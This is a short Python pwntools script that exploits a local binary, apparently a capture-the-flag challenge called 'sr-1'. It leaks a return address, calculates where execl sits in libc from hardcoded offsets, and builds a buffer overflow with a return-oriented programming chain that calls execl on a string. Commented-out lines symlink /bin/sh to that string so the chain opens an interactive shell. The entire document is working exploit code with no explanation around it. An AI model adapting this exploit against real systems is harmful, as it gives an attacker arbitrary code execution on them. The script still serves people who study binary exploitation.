#!/usr/bin/env python

from pwn import *
import os

p = process('./sr-1')

print(p.recv())
p.sendline("192") #offset from buffer to ret addr of main

data = p.recv()
#print (len(data))
#print (repr(data))

addr = data[184:192]
print(repr(addr))
addr = u64(addr)
print(hex(addr))

"""
0x7fdf30ac7a20 <--execl
0x7fdf30a1b830 <-- in the middle of libc_start_main
"""
execl_temp = 0x7fdf30ac7a20
libc_ = 0x7fdf30a1b830

offset = execl_temp - libc_

execl = offset + addr

buf = "A" * 0x80 + "BBBBBBBB"

"""
0x0000000000400783 : pop rdi ; ret
0x0000000000400781 : pop rsi ; pop r15 ; ret
"""

pop_rdi_ret = p64(0x400783)
pop_rsi_pop_ret = p64(0x400781)

string = p64(0x4008d8)

#if os.path.exists("$"):
#    os.unlink("$")

#os.symlink("/bin/sh", "$")

buf += pop_rdi_ret
buf += string
buf += pop_rsi_pop_ret
buf += p64(0) + p64(0)
buf += p64(execl)


with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()

